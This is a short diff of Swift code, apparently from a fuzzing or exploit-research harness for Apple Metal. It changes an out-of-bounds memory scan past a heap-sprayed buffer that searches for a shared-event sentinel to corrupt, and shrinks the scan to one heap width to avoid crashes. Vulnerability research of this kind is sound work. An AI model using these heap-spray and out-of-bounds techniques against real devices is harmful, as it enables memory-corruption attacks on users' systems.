@@ -569,11 +569,12 @@ func runSharedEventCorrupt(log: FuzzLog, completion: @escaping () -> Void) {
         let pSrc = heapPtrs[srcI]; let vaSrc = heapVas[srcI]
         step("OOB src heap va=0x\(String(vaSrc,radix:16))")
 
-        // Scan OOB past src for event sentinel — stay within heap spray VA range
-        // Safe bound: all heaps are in contiguous VA (confirmed by spray test)
-        // scanLimit = number of heaps × actual — all within Metal's shared vm region
-        let scanQwords = (heapVas.count * actual) / 8
-        step("scanning \(scanQwords*8) bytes past src for event sentinel...")
+        // Scan OOB past src for event sentinel — ONLY within adjacent heap h_dst range.
+        // Reading past the contiguous heap block hits unmapped CPU VA → SIGSEGV.
+        // MTLSharedEvent backing is likely a separate IOKit VA pool; if not found here
+        // we fall back to the unmodified signal round-trip test.
+        let scanQwords = actual / 8   // exactly one heap width = 16384 bytes = safe
+        step("scanning \(scanQwords*8) bytes (1 heap width) past src for event sentinel...")
         var evOffset = -1; var evIdx = -1
         for qw in 0..<scanQwords {
             var val: UInt64 = 0
